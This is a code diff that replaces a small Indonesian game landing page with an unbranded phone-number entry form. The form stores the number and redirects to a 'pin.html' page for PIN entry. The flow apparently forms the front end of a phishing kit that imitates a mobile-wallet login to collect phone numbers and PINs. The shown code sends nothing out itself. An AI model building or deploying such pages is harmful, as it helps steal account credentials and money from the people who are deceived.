@@ -1,53 +1,32 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Bayu Game</title>
+  <meta charset="UTF-8">
+  <title>Masukkan Nomor HP</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body {
-      margin: 0;
-      font-family: sans-serif;
-      background: linear-gradient(to bottom, #0f2027, #203a43, #2c5364);
-      color: white;
-      text-align: center;
-    }
-    header {
-      padding: 80px 20px;
-    }
-    h1 {
-      font-size: 2.5em;
-    }
-    p {
-      font-size: 1.2em;
-      color: #ccc;
-    }
-    .btn {
-      background: #f39c12;
-      color: white;
-      padding: 15px 30px;
-      text-decoration: none;
-      border-radius: 5px;
-      font-size: 1em;
-      margin-top: 20px;
-      display: inline-block;
-    }
-    footer {
-      margin-top: 80px;
-      font-size: 0.9em;
-      color: #999;
-    }
+    body { background-color: #008CFF; color: white; font-family: sans-serif; text-align: center; padding: 30px; }
+    .form-box { background: white; padding: 20px; border-radius: 12px; color: #000; max-width: 350px; margin: auto; }
+    input, button { width: 90%; padding: 10px; font-size: 16px; border-radius: 8px; margin: 10px 0; }
+    button { background-color: #007AFF; color: white; border: none; }
   </style>
 </head>
 <body>
-  <header>
-    <h1>Selamat Datang di Bayu Game</h1>
-    <p>Game seru, tampilan keren, tanpa judi!</p>
-    <a href="#" class="btn">Main Sekarang</a>
-  </header>
+  <h2>Masukkan Nomor HP</h2>
+  <div class="form-box">
+    <label>+62</label>
+    <input type="tel" id="nomor" placeholder="8123456789" maxlength="13" />
+    <button onclick="lanjut()">LANJUTKAN</button>
+  </div>
 
-  <footer>
-    &copy; 2025 Bayu Game. Semua hak dilindungi.
-  </footer>
+  <script>
+    function lanjut() {
+      const nomor = document.getElementById('nomor').value;
+      if (!nomor) return alert("Masukkan nomor HP!");
+
+      localStorage.setItem("nomorHP", "+62" + nomor);
+      window.location.href = "pin.html"; // halaman isi PIN
+    }
+  </script>
 </body>
 </html>
